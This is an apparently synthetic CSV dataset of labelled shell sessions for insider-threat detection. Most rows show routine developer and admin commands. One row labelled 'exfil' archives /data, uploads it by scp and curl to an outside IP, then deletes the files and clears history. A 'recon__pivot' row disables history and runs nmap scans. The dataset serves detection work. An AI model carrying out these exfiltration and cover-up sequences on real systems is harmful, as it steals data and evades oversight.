session_id,user_id,role,hostname,session_start,session_duration_s,after_hours,command_count,command_sequence,label,attack_type
6450f5150aa0466b822ce6717ae2c0b1,u0066,dev,analyst-ws-05,2025-11-20 10:51:11,842,0,33,cp /etc/passwd /tmp/<TMPFILE> -> pwd -> make build -> echo $USER -> history | tail -<NUM> -> alias ll='ls -la' -> alias ll='ls -la' -> cat config/prod.yaml -> echo $USER -> ls -la /var/spool/cron/ -> ls -lh -> pip list --outdated -> ls -la -> echo $PATH -> make test -> ls -lh -> clear -> flake8 src/ --max-line-length <NUM> -> cat /etc/cron.d/logrotate -> git log --oneline -<NUM> -> ssh -i ~/.ssh/id_rsa deploy@build-agent -> groups -> flake8 src/ --max-line-length <NUM> -> cd ~ -> cat config/prod.yaml -> pytest tests/unit/ --cov=src --cov-report=term-missing -> find . -name '*.py' | xargs wc -l -> ss -antp -> env | grep DATABASE -> pip install sqlalchemy -> git stash -> which python -> exit,1,none
549e5122b3d845cc8e7570060907da90,u0071,analyst,analyst-ws-09,2025-11-20 11:27:12,1987,0,21,"md5sum /data/payroll.xlsx -> python analyze.py --input /data/transactions.csv --output /tmp/<TMPFILE> -> du -sh /data/* -> history | tail -<NUM> -> diff /data/users.db /backup/transactions.csv -> echo $PATH -> grep -i 'fail' /var/log/app.log -> head -<NUM> /data/customers.csv -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> sort -t',' -k1 -n /data/report.parquet | tail -<NUM> -> python analyze.py --input /data/customers.csv --output /tmp/<TMPFILE> -> wc -l /data/report.parquet -> uptime -> clear -> cut -d',' -f4,6 /data/payroll.xlsx | head -> python analyze.py --input /data/report.parquet -> echo $USER -> cd ~ -> ls -lh /data -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> exit",0,none
1b316210953f435195ff47059aad7faf,u0075,analyst,admin-srv-08,2025-11-20 12:09:44,2229,0,20,"clear -> sqlite3 analytics.db 'SELECT COUNT(*) FROM audit;' -> history | tail -<NUM> -> date -> ls -lh /data -> python analyze.py --input /data/customers.csv -> python -c 'import pandas as pd; df=pd.read_csv(""/data/transactions.csv""); print(df.describe())' -> jupyter nbconvert --to script analysis_34f9.ipynb -> python analyze.py --input /data/users.db -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/nginx.log | wc -l -> python -c 'import pandas as pd; df=pd.read_csv(""/data/embeddings.npy""); print(df.describe())' -> cd .. -> echo $USER -> sort -t',' -k3 -n /data/report.parquet | tail -<NUM> -> echo $PATH -> python analyze.py --input /data/embeddings.npy -> awk '{print $1}' /var/log/syslog | sort | uniq -c | sort -rn | head -<NUM> -> which python -> less /var/log/access.log -> exit",0,none
4e314a95744941ef80cb8c3845bbdd7f,u0002,dev,dev-ws-06,2025-11-20 16:59:36,1072,0,24,whoami -> docker run --rm -p <NUM>:<NUM> myapp:latest -> cd ~ -> pwd -> history | tail -<NUM> -> docker logs <HEX> --tail <NUM> -> pip install -r requirements.txt -> find . -name '*.py' | xargs wc -l -> ls -la /var/spool/cron/ -> echo $PATH -> git pull origin main -> tail -f logs/access.log -> pip install -r requirements.txt -> flake8 src/ --max-line-length <NUM> -> pytest tests/unit/ --cov=src --cov-report=term-missing -> ls -la ~/.ssh/ -> sudo -l -> export DEBUG=true -> cat ~/.gitconfig -> cat logs/nginx.log -> cd ~/projects/api-gateway -> grep -r 'TODO' src/ -> ls -la -> exit,1,none
9a6feeb985d34b10ac89ff6760a9e2c9,u0049,dev,analyst-ws-08,2025-11-21 09:47:34,2391,0,25,pip install scikit-learn -> sl -> which git -> pwd -> env | grep REDIS -> echo $USER -> curl -s http://localhost:<NUM>/health -> cat logs/access.log -> tar -czf /tmp/<TMPFILE> ~/ -> source ~/.bashrc -> pwd -> history | tail -<NUM> -> docker build -t myapp:87a1 . -> alias ll='ls -la' -> echo <HEX> | base64 -d -> traceroute <IP> -> git log --oneline -<NUM> -> docker logs <HEX> --tail <NUM> -> man ls -> export DEBUG=production -> cat /etc/cron.d/monitoring -> history | tail -<NUM> -> cd .. -> vim sync.py -> exit,1,none
89720f7d78324f6a9023eb9c82decc5f,u0000,dev,analyst-ws-08,2025-11-21 12:47:49,736,0,20,"ls -> vim sync.py -> cat config/settings.yaml -> python -c 'import pandas as pd; df=pd.read_csv(""/data/embeddings.npy""); print(df.describe())' -> sqlite3 analytics.db 'SELECT COUNT(*) FROM sessions;' -> git diff HEAD~1 -> env | grep REDIS -> cat config/dev.yaml -> git pull origin develop -> flake8 src/ --max-line-length <NUM> -> make build -> cat config/settings.yaml -> pytest tests/unit/ --cov=src --cov-report=term-missing -> which git -> clear -> pip install -r requirements.txt -> git stash -> python -m pytest tests/ -v -> pwd -> exit",0,none
a137532d334a4ffcb8e42d1346ab6064,u0007,admin,dev-ws-10,2025-11-21 13:28:14,1497,0,24,getent passwd -> grep -i 'error\|warn' /var/log/syslog | tail -<NUM> -> head -<NUM> /data/users.db -> awk '{print $1}' /var/log/access.log | sort | uniq -c | sort -rn | head -<NUM> -> diff /data/transactions.csv /backup/transactions.csv -> journalctl -xe --since '<NUM> hour ago' -> sudo apt install -y auditd -> tar -czf /tmp/<TMPFILE> ~/ -> ping -c 8 <IP> -> echo $PATH -> find /home -name '*.pem' 2>/dev/null -> zip -r /tmp/<TMPFILE> /data/ -> sudo nano /etc/resolv.conf -> journalctl -xe --since '3 hour ago' -> sudo apt update -> sudo apt update -> sudo systemctl status nginx -> sudo ufw allow <NUM>/tcp -> sudo ufw status verbose -> df -h -> sudo journalctl --since '7 days ago' | grep -i fail -> who -> ping -c <NUM> <IP> -> exit,1,none
20b5cdb6eebd44388339243f27f5c867,u0058,admin,analyst-ws-06,2025-11-21 14:36:08,2304,0,13,sudo iptables -L -n -> find /home -name '*.pfx' 2>/dev/null -> source ~/.bashrc -> dockr ps -> sudo apt autoremove -y -> cat ~/.bash_history -> netstat -an | grep ESTABLISHED -> echo <HEX> | base64 -d -> env | grep -i secret -> journalctl -xe --since '<NUM> hour ago' -> iostat -x 1 3 -> which git -> exit,1,none
d212e4c825154775804f883d9b4d67f9,u0015,dev,dev-ws-12,2025-11-22 08:05:52,87,0,25,nano config/settings.yaml -> docker ps -> pwd -> make build -> git status -> docker ps -> ssh -i ~/.ssh/id_rsa deploy@log-collector -> history | tail -<NUM> -> pwd -> pytest tests/unit/ --cov=src --cov-report=term-missing -> pytest tests/unit/ --cov=src --cov-report=term-missing -> ls -lh -> git checkout -b feature/<HEX> -> grep -r 'TODO' src/ -> which python -> ls -la -> echo $PATH -> source ~/.bashrc -> git stash -> uptime -> nano config/prod.yaml -> pip install -r requirements.txt -> env | grep API -> docker run --rm -p <NUM>:<NUM> myapp:latest -> exit,0,none
85841cdf2b844502aaa8048737fc5369,u0030,dev,analyst-ws-09,2025-11-22 12:38:10,3576,0,10,id -> make test -> docker ps -> docker build -t myapp:1c03 . -> git checkout -b feature/<HEX> -> arp -a -> getent passwd -> cat logs/debug.log -> ls -la -> exit,1,none
33e53d5a072c44759384cd98bb890649,u0060,admin,dev-ws-14,2025-11-22 13:17:29,806,0,26,netstat -tulpn -> who -> sudo nano /etc/hosts -> ss -tlnp -> sudo chown www-data /var/www/html -> top -bn1 | head -<NUM> -> sudo iptables -L -n -> cd .. -> df -h -> alias ll='ls -la' -> netstat -tulpn -> date -> vmstat 1 5 -> ls -lh -> sudo systemctl status cron -> man sed -> alias ll='ls -la' -> source ~/.bashrc -> sudo iptables -L -n -> journalctl -xe --since '<NUM> hour ago' -> who -> whoami -> ping -c 9 <IP> -> sudo ufw allow <NUM>/tcp -> sudo ufw status verbose -> exit,0,none
c780c4a3f4cf41cbbfda964c744fe443,u0000,dev,analyst-ws-02,2025-11-22 18:39:05,982,0,11,git diff HEAD~2 -> git stash -> make build -> ip a -> tail -f logs/syslog -> clear -> crontab -e -> docker run --rm -p <NUM>:<NUM> myapp:latest -> nmap -p <NUM>-<NUM> <IP>/<NUM> -> cat config/settings.yaml -> exit,0,none
4998af85c4584f0d8e3f91966d6af83f,u0055,dev,admin-srv-02,2025-11-23 14:44:12,972,0,27,"tail -f logs/nginx.log -> man sed -> cat config/dev.yaml -> cat config/dev.yaml -> pytest tests/unit/ --cov=src --cov-report=term-missing -> date -> curl -s http://localhost:<NUM>/health -> echo $PATH -> source ~/.bashrc -> export ENV=true -> docker ps -> pip list --outdated -> pip list --outdated -> find . -name '*.py' | xargs wc -l -> cd ~ -> make build -> docker run --rm -p <NUM>:<NUM> myapp:latest -> git checkout -b feature/<HEX> -> clear -> cut -d',' -f4,7 /data/model_weights.pkl | head -> cut -d',' -f4,9 /data/users.db | head -> awk '{print $1}' /var/log/auth.log | sort | uniq -c | sort -rn | head -<NUM> -> vim train.py -> alias ll='ls -la' -> ls -la -> docker ps -> exit",0,none
22f6df2cda384b7c8eb5bdaefd8a7777,u0029,analyst,dev-ws-08,2025-11-23 16:03:57,2302,0,25,"alias ll='ls -la' -> source ~/.bashrc -> rsync -avz /data/ archive-srv:/backup/data/ -> history | tail -<NUM> -> ls -la -> which git -> rsync -avz /data/ backup-<NUM>:/backup/data/ -> diff /data/model_weights.pkl /backup/model_weights.pkl -> clear -> cat /data/customers.csv -> du -sh /data/* -> awk '{print $1}' /var/log/debug.log | sort | uniq -c | sort -rn | head -<NUM> -> uptime -> du -sh /data/* -> cut -d',' -f3,6 /data/model_weights.pkl | head -> alias ll='ls -la' -> pwd -> python -c 'import pandas as pd; df=pd.read_csv(""/data/report.parquet""); print(df.describe())' -> cd .. -> python analyze.py --input /data/customers.csv --output /tmp/<TMPFILE> -> scp /tmp/<TMPFILE> dev-<NUM>:/backup/ -> grep -i 'fail' /var/log/syslog -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> scp /tmp/<TMPFILE> dev-<NUM>:/backup/ -> exit",0,none
4635edc6ebe14a159ed2378f92257875,u0022,dev,analyst-ws-01,2025-11-23 17:46:01,3580,0,14,clear -> env | grep API -> cd ~/projects/billing-svc -> docker ps -> vim deploy.sh -> black src/ -> docker run --rm -p <NUM>:<NUM> myapp:latest -> git status -> git pull origin main -> cd .. -> find . -name '*.py' | xargs wc -l -> docker build -t myapp:08d3 . -> export DEBUG=production -> exit,0,none
3b5034c17f68422f829f1ef8680bfa32,u0072,admin,analyst-ws-12,2025-11-23 17:54:28,1662,0,30,cat /var/log/error.log -> netstat -tulpn -> sudo -l -> free -m -> sudo journalctl --since '6 days ago' | grep -i fail -> ls -la /var/spool/cron/ -> vmstat 1 5 -> history | tail -<NUM> -> sudo -l -> source ~/.bashrc -> journalctl -xe --since '9 hour ago' -> alias ll='ls -la' -> uptime -> alias ll='ls -la' -> ss -tlnp -> sudo ufw allow <NUM>/tcp -> grep -i 'error\|warn' /var/log/syslog | tail -<NUM> -> history | tail -<NUM> -> uptime -> cat /var/log/debug.log -> crontab -l -> who -> sudo systemctl status docker -> arp -a -> top -bn1 | head -<NUM> -> cat /var/log/app.log -> sudo ufw status verbose -> sudo iptables -L -n -> top -bn1 | head -<NUM> -> exit,1,none
30c75038fdbc4c76b4e31ec35dd885d2,u0024,analyst,analyst-ws-06,2025-11-24 02:01:50,2760,1,17,"diff /data/payroll.xlsx /backup/report.parquet -> grep -i 'timeout' /var/log/nginx.log -> python -c 'import pandas as pd; df=pd.read_csv(""/data/transactions.csv""); print(df.describe())' -> head -<NUM> /data/users.db -> awk '{print $1}' /var/log/nginx.log | sort | uniq -c | sort -rn | head -<NUM> -> alias ll='ls -la' -> head -<NUM> /data/users.db -> python -c 'import pandas as pd; df=pd.read_csv(""/data/embeddings.npy""); print(df.describe())' -> man awk -> rsync -avz /data/ nas-store:/backup/data/ -> python -c 'import pandas as pd; df=pd.read_csv(""/data/customers.csv""); print(df.describe())' -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> ls -lh -> psql -U analyst -c 'SELECT * FROM daily_stats LIMIT <NUM>;' -> source ~/.bashrc -> man awk -> exit",0,none
502a9fbc9c764fb8a23f4714d67662df,u0074,dev,dev-ws-08,2025-11-24 07:23:42,3535,1,25,docker logs <HEX> --tail <NUM> -> ls -la ~/.ssh/ -> pip install -r requirements.txt -> cat /etc/cron.d/backup -> env | grep SECRET -> history | tail -<NUM> -> find / -perm -<NUM> 2>/dev/null -> pip install requests -> alias ll='ls -la' -> cat config/dev.yaml -> echo $USER -> clear -> cat config/settings.yaml -> ss -antp -> docker build -t myapp:8be1 . -> which git -> whoami -> cat config/dev.yaml -> git status -> docker ps -> which python -> ip route show -> ssh -i ~/.ssh/id_rsa deploy@data-lake -> pytest tests/unit/ --cov=src --cov-report=term-missing -> exit,1,none
f0ebe13b4c1047beaf1c479bae9a8d28,u0067,dev,dev-ws-08,2025-11-24 08:49:50,802,0,11,echo $USER -> git checkout -b feature/<HEX> -> ssh -i ~/.ssh/id_rsa deploy@build-agent -> git status -> git diff HEAD~1 -> docker logs <HEX> --tail <NUM> -> cat config/settings.yaml -> history | tail -<NUM> -> git log --oneline -<NUM> -> git pull origin develop -> exit,0,none
5fc9f39a86f4424b936e6daef6e6dfde,u0001,analyst,dev-ws-15,2025-11-24 09:01:36,836,0,26,psql -U analyst -c 'SELECT * FROM events LIMIT <NUM>;' -> sqlite3 analytics.db 'SELECT COUNT(*) FROM audit;' -> head -<NUM> /data/users.db -> date -> find /data -name '*.db' -mtime -5 -> find /var/log -name '*.log' -size +36M -> tar -czf /tmp/<TMPFILE> /data/ 2>/dev/null -> split -b 191M /tmp/<TMPFILE> /tmp/<TMPFILE> -> scp /tmp/<TMPFILE> ubuntu@<IP>:/uploads/ -> curl -s -F 'file=@/tmp/<TMPFILE> http://<IP>:<NUM>/upload -> rm -f /tmp/<TMPFILE> /tmp/<TMPFILE> -> history -c -> cat /data/report.parquet -> history | tail -<NUM> -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> git pull origin develop -> git log --oneline -<NUM> -> cat logs/auth.log -> cd ~ -> scp /tmp/<TMPFILE> archive-srv:/backup/ -> uptime -> head -<NUM> /data/model_weights.pkl -> sqlite3 analytics.db 'SELECT COUNT(*) FROM events;' -> history | tail -<NUM> -> sqlite3 analytics.db 'SELECT COUNT(*) FROM audit;' -> exit,2,exfil
aaf23f6e4cfe44c88f4e1f79acec91b5,u0029,analyst,dev-ws-11,2025-11-24 12:11:11,2611,0,12,grep -i 'fail' /var/log/auth.log -> whoami -> cd ~ -> jupyter nbconvert --to script analysis_a49f.ipynb -> history | tail -<NUM> -> ls -lh -> jupyter nbconvert --to script analysis_d9cb.ipynb -> ls -la -> awk '{print $1}' /var/log/nginx.log | sort | uniq -c | sort -rn | head -<NUM> -> alias ll='ls -la' -> psql -U analyst -c 'SELECT * FROM users LIMIT <NUM>;' -> exit,0,none
7d87d8a4e38d47c3a7a4f81372a09ab7,u0015,dev,dev-ws-09,2025-11-24 12:50:38,2185,0,28,uptime -> ls -la -> vim migrate.py -> which git -> git diff HEAD~2 -> ping -c 8 <IP> -> cat logs/error.log -> ss -antp -> which python -> cat /etc/group -> docker ps -> date -> export DEBUG=production -> ls -lh -> env | grep API -> whoami -> python -m pytest tests/ -v -> grep -r 'TODO' src/ -> pwd -> cat logs/debug.log -> pwd -> getent passwd -> python train.py -> git pull origin develop -> flake8 src/ --max-line-length <NUM> -> export ENV=true -> git stash -> exit,1,none
5cb7e0414ed643b7a5d0ff4bf0055fd6,u0046,analyst,analyst-ws-01,2025-11-24 13:23:02,204,0,30,"cd .. -> less /var/log/error.log -> echo $USER -> man sed -> cd .. -> man grep -> man find -> awk '{print $1}' /var/log/audit.log | sort | uniq -c | sort -rn | head -<NUM> -> ip route show -> awk '{print $1}' /var/log/app.log | sort | uniq -c | sort -rn | head -<NUM> -> cd ~ -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/error.log | wc -l -> which git -> uptime -> ls -lh -> jupyter nbconvert --to script analysis_6fa3.ipynb -> whoami -> scp /tmp/<TMPFILE> backup-<NUM>:/backup/ -> whoami -> source ~/.bashrc -> python analyze.py --input /data/payroll.xlsx --output /tmp/<TMPFILE> -> python analyze.py --input /data/model_weights.pkl --output /tmp/<TMPFILE> -> scp /tmp/<TMPFILE> nas-store:/backup/ -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> python -c 'import pandas as pd; df=pd.read_csv(""/data/model_weights.pkl""); print(df.describe())' -> python -c 'import pandas as pd; df=pd.read_csv(""/data/model_weights.pkl""); print(df.describe())' -> cd ~ -> cd ~ -> ls -la /etc/cron* -> exit",1,none
4a71da9b73e645fbb602cd157dd11476,u0044,dev,analyst-ws-02,2025-11-24 18:41:35,89,0,14,git pull origin develop -> cat ~/.bash_history -> docker build -t myapp:a415 . -> ip neigh show -> cat /etc/group -> alias ll='ls -la' -> grep -r 'TODO' src/ -> tar -czf /tmp/<TMPFILE> ~/ -> pytest tests/unit/ --cov=src --cov-report=term-missing -> cd ~/projects/auth-service -> cat /etc/cron.d/monitoring -> ssh -i ~/.ssh/id_rsa deploy@build-agent -> docker run --rm -p <NUM>:<NUM> myapp:latest -> exit,1,none
1d00adefe65644c58653e163e063df7c,u0076,admin,admin-srv-07,2025-11-25 10:00:10,1357,0,25,groups -> sudo systemctl status nginx -> ip route show -> which git -> crontab -l -> pwd -> sudo systemctl enable celery -> ls -la -> zip -r /tmp/<TMPFILE> /data/ -> sudo apt autoremove -y -> !! -> ss -antp -> sudo chown www-data /var/www/html -> sudo chmod <NUM> /etc/nginx/nginx.conf -> df -h -> man sed -> cat /var/log/app.log -> free -m -> journalctl -u redis -n <NUM> -> ls -la ~/.ssh/ -> sudo apt update -> sudo apt install -y libssl-dev -> ss -tlnp -> crontab -l -> exit,1,none
90609523799b4d9a84800727de223d9d,u0025,dev,analyst-ws-12,2025-11-25 11:52:36,734,0,33,date -> pip install -r requirements.txt -> find . -name '*.py' | xargs wc -l -> cat config/settings.yaml -> crontab -e -> whoami -> export HISTSIZE=0 -> history -c -> id -> uname -r -> cat /etc/os-release -> ip a -> ip route -> nmap -sV -p <NUM>-<NUM> <IP> -> cat /etc/hosts -> arp -a -> nmap -p- <IP> -T4 -> ps aux --sort=-%cpu | head -<NUM> -> cat /proc/version -> find / -writable -type d 2>/dev/null | head -<NUM> -> ls -la /opt/ -> cat /etc/crontab -> vim cleanup.py -> black src/ -> python -m pytest tests/ -x -> git pull origin main -> sl -> ls -la -> env | grep -i path -> sudo -l -> tail -f logs/audit.log -> docker logs <HEX> --tail <NUM> -> exit,2,recon__pivot
f44a7339df5341aa96a0a97cca9037f1,u0005,analyst,dev-ws-02,2025-11-25 15:53:55,2413,0,14,"echo <HEX> | base64 -d -> cat /data/payroll.xlsx -> whoami -> ls -> head -<NUM> /data/embeddings.npy -> scp /tmp/<TMPFILE> build-agent:/backup/ -> less /var/log/nginx.log -> awk '{print $1}' /var/log/app.log | sort | uniq -c | sort -rn | head -<NUM> -> env | grep -i pass -> which python -> ls -lh /data -> cut -d',' -f2,8 /data/customers.csv | head -> crontab -e -> exit",1,none
18b5d23253d4429080d3be351c6fd726,u0072,admin,dev-ws-01,2025-11-25 17:03:52,1625,0,22,clear -> sudo apt install -y net-tools -> cat /var/log/audit.log -> top -bn1 | head -<NUM> -> ls -lh -> history | tail -<NUM> -> sudo journalctl --since '2 days ago' | grep -i fail -> sudo chmod <NUM> /etc/nginx/nginx.conf -> clear -> cd ~ -> sudo systemctl restart auditd -> grep -i 'error\|warn' /var/log/syslog | tail -<NUM> -> who -> history | tail -<NUM> -> top -bn1 | head -<NUM> -> sudo systemctl status docker -> iostat -x 1 3 -> cat /var/log/access.log -> sudo -l -> echo $PATH -> journalctl -xe --since '6 hour ago' -> exit,0,none
d8b7584cc42c4863a4ebb49dfda21cc6,u0074,dev,dev-ws-06,2025-11-26 06:37:17,1701,1,27,git status -> git stash -> git log --oneline -<NUM> -> git diff HEAD~1 -> pip list --outdated -> cd .. -> pytest tests/unit/ --cov=src --cov-report=term-missing -> curl -s http://localhost:<NUM>/health -> which python -> cd ~ -> alias ll='ls -la' -> alias ll='ls -la' -> tail -f logs/access.log -> git stash -> docker build -t myapp:e9c8 . -> whoami -> date -> cd ~ -> python -m pytest tests/ -x -> which python -> uptime -> git log --oneline -5 -> pwd -> history | tail -<NUM> -> which git -> clear -> exit,0,none
d056998887ae4a879ed5c66cdd56182a,u0008,dev,dev-ws-03,2025-11-26 09:56:38,2539,0,35,"pip install -r requirements.txt -> pip install cryptography -> arp -a -> python -m pytest tests/ -v -> vim cleanup.py -> flake8 src/ --max-line-length <NUM> -> ss -antp -> git checkout -b feature/<HEX> -> ls -lh -> git status -> which git -> docker run --rm -p <NUM>:<NUM> myapp:latest -> cd ~ -> docker build -t myapp:0f72 . -> ls -la -> nano config/dev.yaml -> pip install sqlalchemy -> ls -lh -> ls -la ~/.ssh/ -> git log --oneline -<NUM> -> cd ~/projects/data-lake -> env | grep DATABASE -> nano config/prod.yaml -> git pull origin develop -> black src/ -> date -> tail -f logs/syslog -> git diff HEAD~2 -> pip list --outdated -> ssh -i ~/.ssh/id_rsa deploy@staging-<NUM> -> python -c 'import pandas as pd; df=pd.read_csv(""/data/payroll.xlsx""); print(df.describe())' -> awk '{print $1}' /var/log/nginx.log | sort | uniq -c | sort -rn | head -<NUM> -> awk '{print $1}' /var/log/nginx.log | sort | uniq -c | sort -rn | head -<NUM> -> date -> exit",1,none
